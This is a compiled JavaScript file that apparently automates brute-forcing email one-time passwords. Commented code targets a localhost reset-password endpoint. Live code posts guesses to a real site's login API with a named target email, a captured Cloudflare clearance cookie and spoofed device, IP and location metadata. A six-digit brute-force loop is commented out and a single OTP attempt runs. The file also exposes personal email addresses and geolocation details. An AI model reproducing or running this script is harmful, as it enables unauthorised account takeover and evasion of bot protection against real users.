"use strict";
// import axios from "axios";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
// const TARGET_EMAIL = "abhishek@gmail.com";
// async function tryOtp(otp: string) {
//   try {
//     const res = await axios.post("http://localhost:9000/reset-password", {
//       email: TARGET_EMAIL,
//       otp,
//       newPassword: "NewSecurePass@123",
//     });
//     if (res.data.success) {
//       console.log(`✅ FOUND OTP: ${otp}`);
//       process.exit(0); // Stop the attack
//     } else {
//       console.log(`❌ Tried OTP: ${otp}`);
//     }
//   } catch (error) {
//     console.log(`❌ Request failed for OTP: ${otp}`);
//   }
// }
// const MIN = 10000
// const MAX = 99999
// const BATCH_SIZE = 100
// async function brutforce() {
//   for(let i=MIN ; i< MAX; i+=BATCH_SIZE){
//     let batch =[];
//     for(let j=i; j<i+BATCH_SIZE; j++){
//       batch.push(await tryOtp(j.toString()))
//     }
//     Promise.all(batch)
//   }
// }
// brutforce()
const axios_1 = __importDefault(require("axios"));
// Your target email
const TARGET_EMAIL = "abhishekgajananraut@gmail.com";
// Simulated userMetaData + request body
function createPayload(otp) {
    return {
        loginOptions: {
            user_state: "",
            mobile: "",
            mob_country_code: "+91",
            otp,
            email: TARGET_EMAIL,
            type: "emailOtp"
        },
        userMetaData: {
            browserVersion: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            screenSize: { width: 1536, height: 426 },
            OS: "Win32",
            network: "N/A",
            timeZone: "Asia/Calcutta",
            deviceType: "Desktop"
        },
        fcmToken: null,
        details: {
            ip: "49.15.250.220",
            country: "India",
            countryCode: "IN",
            state: "Maharashtra",
            city: "Nagpur",
            latitude: 21.1458004,
            longitude: 79.0881546,
            isp: "Vodafone Idea Ltd. vil",
            deviceType: "desktop",
            utm_campaign: "yt_dsa_launch",
            utm_medium: "video",
            utm_source: "youtube",
            referrer: "https://namastedev.com/"
        }
    };
}
// Config with real headers and cookies (⚠️ keep this updated with fresh cf_clearance)
const AXIOS_CONFIG = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://namastedev.com/api/v1/login",
    headers: {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://namastedev.com",
        "referer": "https://namastedev.com/login",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "cookie": 'timezone=asia/calcutta; cf_clearance=ov8k2hESFXTAv6_OsY_AttrBz4gnM0uq0j9iQtIH4dY-1751817776-1.2.1.1-zaSpEEvkuJV_YQzhKTYWBUH8ZYl3mypxsZCfYzxVM2_0V5k92FhpS_YXXaQOmo6NYpyRAW8ICppQY5hu3K_iuVOgcbjeRqVTOp6Cc2W_MfDEKnBXgeAxTE92BgXhvWF.90HfqHh8JW7zlnziouxvVW1jjuSwjxm9.v_5Gpc6or6Ok3mxUzXx.T5pBtMWwduH1GJMKpGUl25flcQG7Na324cZky_OJqNTtWFivCceV6g'
    }
};
// Try one OTP
function tryOtp(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b;
        try {
            const res = yield axios_1.default.post(AXIOS_CONFIG.url, createPayload(otp), AXIOS_CONFIG);
            if (((_a = res.data) === null || _a === void 0 ? void 0 : _a.token) || ((_b = res.data) === null || _b === void 0 ? void 0 : _b.success) === true) {
                console.log(`✅ OTP FOUND: ${otp}`);
                process.exit(0); // stop when success
            }
            else {
                console.log(`❌ Tried OTP: ${otp}`);
            }
        }
        catch (error) {
            console.log(`❌ Request failed for OTP: ${otp}`);
        }
    });
}
// // Brute-force in batch
// async function brutforce() {
//   const MIN = 100000;
//   const MAX = 999999;
//   const BATCH_SIZE = 1000;
//   for (let i = MIN; i < MAX; i += BATCH_SIZE) {
//     const batch = [];
//     for (let j = i; j < i + BATCH_SIZE; j++) {
//       batch.push(tryOtp(j.toString()));
//     }
//     await Promise.all(batch);
//   }
// }
// brutforce();
tryOtp("159638");
